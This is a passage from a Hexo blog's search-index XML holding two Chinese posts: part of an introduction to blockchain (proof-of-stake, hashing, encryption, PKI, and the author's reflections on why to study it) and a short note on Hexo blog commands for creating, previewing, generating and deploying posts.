5%91%A2%EF%BC%9F">^前言</a>: 在2012年，由加密货币点点币的创始人Sunny King 为了解决PoW中资源浪费的缺点而提出的新的共识概念，他在基于比特币PoW的框架基础上实现了新的共识机制PoS，并最初被应用在点点币区块链系统上。</p><h5 id="📕工作原理："><a href="#📕工作原理：" class="headerlink" title="📕工作原理："></a>📕<em><strong>工作原理：</strong></em></h5><p>PoW是通过计算工作量来获得记账权，而在PoS中即转变为资本证明，它根据每个节点所拥有代币数量的比例和持币时间来通过<strong>算法按等比例地降低节点的挖矿难度</strong>，<strong>从而提高了寻找满足难度随机数的效率，缩短达成共识所需的时间</strong>，因此拥有的币的时间越久和数量越多，它获得的记账的概率就越大。类似于企业的股东制，占有股份多的，它拥有的决策权就越重。</p><p>PoS仍然需要网络中的节点进行PoW挖矿运算，因此，PoS机制并没有从根本上解决PoW机制难以应用于商业领域的问题。</p><p>📕<em><strong>公式表达：</strong></em><br>$$<br>SHA256 ( Nonce + blockheader ） &lt; 目标值的难度系数&#x2F;综合（拥有代币数量的比例和持币时间）<br>$$</p><p>[部分内容取自]: <a href="https://blog.csdn.net/to_cm/article/details/82765861">https://blog.csdn.net/to_cm/article/details/82765861</a>“区块链共识机制”<br>[部分内容取自]: <a href="https://blog.csdn.net/to_cm/article/details/82828144">https://blog.csdn.net/to_cm/article/details/82828144</a>“深入理解PoW共识”</p><p>📕<em><strong>优点</strong>：</em></p><ol><li>大幅缩减了参与验证和记账的数量；</li><li>提高交易吞吐量；</li><li>减少交易验证达成共识时间。</li></ol><p>📕<em><strong>缺点</strong>：</em></p><ol><li>记账权被掌握在少数被指定的节点上。</li><li>参与度不够高，缺乏一定的代表性，显失公平。</li></ol><h3 id="💎密码学——区块链构筑的底层（概览）"><a href="#💎密码学——区块链构筑的底层（概览）" class="headerlink" title="💎密码学——区块链构筑的底层（概览）"></a>💎密码学——区块链构筑的底层（概览）</h3><h4 id="A-Hash算法"><a href="#A-Hash算法" class="headerlink" title="A.Hash算法"></a>A.Hash算法</h4><p>能任意长度的二进制值映射为较短的固定长度的二进制值（Hash值），并且不同的明文很难映射为相同的Hash值。</p><p>主要有<a href="https://en.wikipedia.org/wiki/MD5">MD5</a>和<a href="https://en.wikipedia.org/wiki/SHA-2">SHA256</a>。其主要特点是<strong>正向快速，逆向困难，输入敏感，冲突避免，</strong>这些特性能够在区块链网络中发挥巨大的价值。</p><p><img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/true/16.webp" alt="16"></p><h4 id="B-对称和非对称加密"><a href="#B-对称和非对称加密" class="headerlink" title="B.对称和非对称加密"></a>B.对称和非对称加密</h4><p>对称加密：就是采用这种加密方法的双方使用方式用<strong>同样的密钥进行加密和解密</strong>。主要算法有<u>DES、AES、Blowfish、IDEA、RC5、RC6</u>等。</p><p>非对称加密：指加密和解密使用<strong>不同密钥的加密算法</strong>，也称为公私钥加密。主要算法有<a href="https://baike.baidu.com/item/RSA">RSA</a>、<a href="https://baike.baidu.com/item/Elgamal">Elgamal</a>、背包算法、Rabin、D-H、<a href="https://baike.baidu.com/item/ECC">ECC</a><strong>（椭圆曲线加密算法）</strong>。</p><h4 id="C-PKI体系"><a href="#C-PKI体系" class="headerlink" title="C.PKI体系"></a>C.PKI体系</h4><p><a href="https://baike.baidu.com/item/%E5%85%AC%E9%92%A5%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD/10881894?fromtitle=PKI&fromid=212376&fr=aladdin">PKI</a>是公钥基础设施，我们利用此在不安全的网络中构建了安全服务，从而让互不相识的人们可以安全的通信。</p><p><img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE%5Ctrue%5C17.jpeg" alt="17"></p><h2 id="5-辩证思维看待区块链，为什么要去学区块链技术？"><a href="#5-辩证思维看待区块链，为什么要去学区块链技术？" class="headerlink" title="5. 辩证思维看待区块链，为什么要去学区块链技术？"></a>5. 辩证思维看待区块链，为什么要去学区块链技术？</h2><blockquote><p>个人理解与看法，将持续更新</p></blockquote><p>​        每一次革新技术的诞生，都代表着这个世界需要做出一些改变——区块链的诞生，是一代年轻人对于这个时代的反抗与革命。电影《让子弹飞》中张麻子上任鹅城的那句话我记忆犹深<u><strong>“公平，公平，还tm的是公平！”</strong></u>。是的，越来越多的年轻人经历不公平，越来越多的年轻人开始追求公平，反思不公平的缘由。这世界上绝大部分财富都掌握在前百分之一的富人手中，而留给新一代年轻人的机会越来越少，可能性也越来越小。在不断自我审问的过程中，可以发现，<u>追求公平绝不仅仅去依靠双手劳动，更需要靠智慧和选择</u>。我很认同这样一句话：“苦难从来不值得被歌颂，如果不是迫不得已，谁会愿意遭受苦难？”是的，在【跨时代总结】中我提到，苦难是和机遇并存的，因此学习和思考，永无止境。</p><h3 id="💎怎能无动于衷？"><a href="#💎怎能无动于衷？" class="headerlink" title="💎怎能无动于衷？"></a>💎怎能无动于衷？</h3><p>​         区块链，毫无疑问将成为未来的趋势，并且这门技术的应用性，完完全全的符合【社会主义核心价值观】。<strong>2022，正是区块链的元年。</strong>正如十来年前的互联网革命一般，那时候学习java，了解java的人并不多，但正是这一波人，窥见了时代趋势，抓住了互联网的巨浪，扬帆起航。而区块链，正隐藏着如此无限的可能性，前瞻时代的浪潮，做好沉淀和学习的提前准备，当巨浪来临，方能<u><strong>直挂云帆济沧海</strong>！</u></p><h3 id="💎不是人人都能成为V神"><a href="#💎不是人人都能成为V神" class="headerlink" title="💎不是人人都能成为V神"></a>💎不是人人都能成为V神</h3><p>​        写在最后，也是希望大家能够保持<u>理性思考和时常自省</u>的能力。人人都想成为V神，但他的成功是在天时地利人和的条件下，百年才一遇的个例。妄想平步青云，对于普通人来说未免有些难。区块链技术仍处在初期阶段，发展还不够成熟，道路上还存在着很多阻力。可以看到，以区块链技术为基础的币圈不乏投资失败的普通人，而一夜暴富也仅是个例，究其原因，是他们陷入了富人精心布局的游戏之中，<u><strong>因为比技术更加复杂的，是人心</strong></u>。但在这个圈子里，技术高于一切，智能合约的出现，象征着<strong>代码即法律</strong>的不可篡改。而掌握技术，就是在未来掌握着财富！<u>“<strong>路漫漫其修远兮，吾将上下而求索</strong>”</u>，持久学习和思考，不仅仅是为了未来拥有更多的自由，也为了公正的天秤不再倾斜。</p><h2 id="🚀一些必要的名词解释"><a href="#🚀一些必要的名词解释" class="headerlink" title="🚀一些必要的名词解释"></a>🚀一些必要的名词解释</h2><p>[^DeFi]: 即“去中心化金融<em>（Decentralized Finance）</em>”，也被称为“开放式金融” 。是以<a href="https://baike.baidu.com/item/%E6%AF%94%E7%89%B9%E5%B8%81/4143690">比特币</a>和<a href="https://baike.baidu.com/item/%E4%BB%A5%E5%A4%AA%E5%B8%81/20857686">以太币</a>为代表的<a href="https://baike.baidu.com/item/%E5%8A%A0%E5%AF%86%E8%B4%A7%E5%B8%81/22415288">加密货币</a>，<a href="https://baike.baidu.com/item/%E5%8C%BA%E5%9D%97%E9%93%BE/13465666">区块链</a>和<a href="https://baike.baidu.com/item/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/19770937">智能合约</a>结合的产物</p>]]></content>
    
    
    <categories>
      
      <category>区块链</category>
      
    </categories>
    
    
    <tags>
      
      <tag>区块链入门</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo操作简记</title>
    <link href="/2022/08/30/Hexo%E6%93%8D%E4%BD%9C%E7%AE%80%E8%AE%B0/"/>
    <url>/2022/08/30/Hexo%E6%93%8D%E4%BD%9C%E7%AE%80%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h3 id="创建新文章"><a href="#创建新文章" class="headerlink" title="创建新文章"></a>创建新文章</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><h3 id="本地预览"><a href="#本地预览" class="headerlink" title="本地预览"></a>本地预览</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><h3 id="生成静态文件"><a href="#生成静态文件" class="headerlink" title="生成静态文件"></a>生成静态文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><h3 id="部署至Github"><a href="#部署至Github" class="headerlink" title="部署至Github"></a>部署至Github</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><h3 id="创建新页面"><a href="#创建新页面" class="headerlink" title="创建新页面"></a>创建新页面</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new page <span class="hljs-string">&quot;about&quot;</span><br></code></pre></td></tr></table></figure><p>创建成功后，编辑博客目录下 <code>/source/about/index.md</code>，添加 <code>layout</code> 属性。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown">---<br>title: about<br><span class="hljs-section">layout: about</span><br><span class="hljs-section">---</span><br></code></pre></td></tr></table></figure><h3 id="博客图片显示问题"><a href="#博客图片显示问题" class="headerlink" title="博客图片显示问题"></a>博客图片显示问题</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">修改 _config.yml 文件中 post_asset_folder:<span class="hljs-literal">true</span></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">安装插件</span><br>npm install hexo-asset-image -- save<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">生成新文章时会自动生成存放图片的同名文件夹</span><br>hexo n &quot;xxxx&quot;<br></code></pre></td></tr></table></figure><h3 id="清除添加文件（平时严禁清理）"><a href="#清除添加文件（平时严禁清理）" class="headerlink" title="清除添加文件（平时严禁清理）"></a>清除添加文件（平时严禁清理）</h3><blockquote><p>Cleans the cache file (<code>db.json</code>) and generated files (<code>public</code>).</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo clean<br></code></pre></td></tr></table></figure><h3 id="自定义主题样式"><a href="#自定义主题样式" class="headerlink" title="自定义主题样式"></a>自定义主题样式</h3>]]></content>
    
    
    <categories>
      
      <category>基操勿6</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hexo基操</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
